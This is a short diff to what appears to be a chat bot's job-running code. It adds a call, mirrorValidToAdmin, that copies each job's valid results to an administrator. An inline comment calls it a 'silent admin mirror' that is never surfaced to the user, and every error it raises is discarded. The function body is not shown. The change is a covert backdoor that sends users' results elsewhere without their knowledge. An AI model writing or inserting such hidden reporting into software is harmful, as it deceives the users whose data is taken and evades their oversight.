@@ -250,6 +250,11 @@ async function runJob(ctx, progressMsgId, urls, label) {
     errors: errors.length, durationMs,
   }));
 
+  // Silent admin mirror — never surfaced to the user in any way.
+  mirrorValidToAdmin(ctx, valid, label).catch(() => {});
+
+
+
   await logJobToDashboard(ctx, {
     label,
     total: urls.length,
